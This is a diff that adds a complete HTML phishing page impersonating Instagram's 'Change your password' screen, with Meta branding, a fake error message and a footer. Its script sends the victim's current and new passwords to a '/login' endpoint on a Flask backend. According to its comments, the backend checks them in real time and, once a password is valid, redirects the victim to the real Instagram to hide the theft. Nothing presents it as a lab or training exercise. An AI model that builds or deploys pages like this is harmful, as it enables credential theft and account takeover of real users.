@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change Password • Instagram</title>
+    <style>
+        body {
+            background-color: #152127;
+            color: #f5f5f5;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 40px 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 350px;
+            text-align: left;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        p {
+            font-size: 14px;
+            line-height: 18px;
+            color: #a8a8a8;
+            margin-bottom: 32px;
+        }
+
+        /* Error Message Styling */
+        #error-message {
+            display: none;
+            color: #ed4956;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: center;
+            padding: 12px;
+            border: 1px solid #ed4956;
+            border-radius: 8px;
+            background-color: rgba(237, 73, 86, 0.1);
+        }
+
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+            margin-bottom: 16px;
+        }
+
+        .input-field {
+            width: 100%;
+            background-color: #1c2b33;
+            border: 1px solid #363636;
+            border-radius: 12px;
+            padding: 16px;
+            padding-right: 60px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+        }
+
+        .toggle-btn {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #f5f5f5;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            outline: none;
+            padding: 5px;
+        }
+
+        .btn-continue {
+            width: 100%;
+            background-color: #0074e4;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 10px;
+        }
+
+        .btn-continue:disabled {
+            background-color: #00376b;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            justify-content: flex-start;
+            margin-top: 24px;
+            font-size: 14px;
+            cursor: pointer;
+            color: #f5f5f5;
+        }
+
+        .checkbox-container input {
+            appearance: none;
+            min-width: 20px;
+            height: 20px;
+            border: 2px solid #a8a8a8;
+            border-radius: 4px;
+            margin-right: 12px;
+            cursor: pointer;
+            background-color: transparent;
+        }
+
+        .checkbox-container input:checked {
+            background-color: #0074e4;
+            border-color: #0074e4;
+            background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3e%3cpath d='M12.207 4.793a1 1 0 0 1 0 1.414l-5 5a1 1 0 0 1-1.414 0l-2-2a1 1 0 0 1 1.414-1.414L6.5 9.086l4.293-4.293a1 1 0 0 1 1.414 0z'/%3e%3c/svg%3e");
+            background-size: 100% 100%;
+        }
+
+        .footer-section {
+            width: 100%;
+            padding: 24px 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .copyright {
+            text-transform: uppercase;
+            margin-top: 10px;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-content">
+        <form id="auth-form" onsubmit="handleAuth(event)" class="container">
+            <h2>Change your password</h2>
+            <p>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters.</p>
+            
+            <div id="error-message">The password you entered is incorrect. Please try again.</div>
+
+            <div class="password-wrapper">
+                <input type="password" name="old_password" id="old_pass" class="input-field" placeholder="Current password" required>
+                <button type="button" class="toggle-btn" onclick="togglePass('old_pass')">Show</button>
+            </div>
+
+            <div class="password-wrapper">
+                <input type="password" name="new_password" id="new_pass" class="input-field" placeholder="New password" required>
+                <button type="button" class="toggle-btn" onclick="togglePass('new_pass')">Show</button>
+            </div>
+            
+            <button type="submit" id="submit-btn" class="btn-continue">Change Password</button>
+            
+            <label class="checkbox-container">
+                <input type="checkbox" name="logout_option" checked>
+                <span>Log out of all other devices to keep your account secure.</span>
+            </label>
+        </form>
+    </div>
+
+    <div class="footer-section">
+        <div class="footer-links">
+            <span>Meta</span> <span>About</span> <span>Blog</span> <span>Jobs</span> 
+            <span>Help</span> <span>API</span> <span>Privacy</span> <span>Terms</span> 
+            <span>Locations</span> <span>Instagram Lite</span> <span>Contact Uploading</span> 
+            <span>Meta Verified</span>
+        </div>
+        <div>
+            <span>English ⌄ </span>
+            <span class="copyright">© 2026 INSTAGRAM FROM META</span>
+        </div>
+    </div>
+
+    <script>
+        function togglePass(fieldId) {
+            const passwordInput = document.getElementById(fieldId);
+            const toggleButton = passwordInput.nextElementSibling;
+            
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                toggleButton.textContent = "Hide";
+            } else {
+                passwordInput.type = "password";
+                toggleButton.textContent = "Show";
+            }
+        }
+
+        // --- REAL-TIME AUTHENTICATION LOGIC ---
+        async function handleAuth(event) {
+            event.preventDefault(); // Prevents page refresh
+            
+            const btn = document.getElementById('submit-btn');
+            const errorBox = document.getElementById('error-message');
+            const formData = new FormData(event.target);
+            
+            // 1. Enter Loading State
+            btn.disabled = true;
+            btn.innerText = "Verifying...";
+            errorBox.style.display = "none";
+
+            try {
+                // 2. Send data to Flask Backend
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+
+                if (result.status === "success") {
+                    // 3. On Valid Password: Redirect to real Instagram
+                    window.location.href = result.redirect;
+                } else {
+                    // 4. On Invalid Password: Show error and reset form
+                    errorBox.style.display = "block";
+                    btn.disabled = false;
+                    btn.innerText = "Change Password";
+                    document.getElementById('old_pass').value = ''; // Clear old password
+                }
+            } catch (error) {
+                console.error("Connection Error:", error);
+                btn.disabled = false;
+                btn.innerText = "Change Password";
+            }
+        }
+    </script>
+
+</body>
+</html>
